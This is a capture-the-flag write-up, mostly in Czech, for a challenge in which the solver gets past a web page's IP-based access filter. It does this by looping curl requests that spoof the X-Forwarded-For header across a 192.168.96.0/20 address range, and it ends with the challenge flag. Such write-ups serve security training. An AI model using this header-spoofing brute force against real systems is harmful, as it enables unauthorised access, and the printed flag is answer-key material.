# Component replacement

## Zadání

Ahoy, officer,

the ship had to lower its speed because of broken `fuel efficiency enhancer`. To order a correct spare part, the chief engineer needs to know exact identification code of the spare part. However, he cannot access the web page listing all the key components in use. Maybe the problem has to do with recently readdressing of the computers in the engine room - the old address plan for whole ship was based on range `192.168.96.0/20`. Your task is to find out the identification code of the broken component.

May you have fair winds and following seas!

The webpage with spare parts listing is available at [http://key-parts-list.cns-jv.tcc](http://key-parts-list.cns-jv.tcc).

Hint 1: Use VPN

Hint 2: Try to bypass the IP address filter.

## Řešení

- přístup na web vyhodí chybu: `You are attempting to access from the IP address 10.200.0.18, which is not assigned to engine room. Access denied.`
- z jiného CTF zkušenost, že může pomoci úprava hlavičky
- Google dotaz na bypass pomocí hlavičky radí použít  [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For): `X-Forwarded-For: <client>, <proxy1>, <proxy2>`, například `X-Forwarded-For: 203.0.113.195`
- ze zadání vím, že původní IP byla z rozsahu 192.168.96.0/20
- skript pro generování IP: 
	```
	import ipaddress
	net = ipaddress.ip_network("192.168.96.0/20")
	for ip in net:
		print(str(ip))
	```
- všechny IP lze otestovat pomocí skrptu 
	```
	while read ipaddress; do
        curl -H "X-Forwarded-For: $ipaddress" http://key-parts-list.cns-jv.tcc/
        echo
	done < ./addresses.txt
	```
- spuštění výstupu do texťáku: `bash curl_script.sh | tee response.txt`
- vyhledání flagu: `grep -i "fuel efficiency enhancer" response.txt`

FLAG: `FLAG{MN9o-V8Py-mSZV-JkRz}`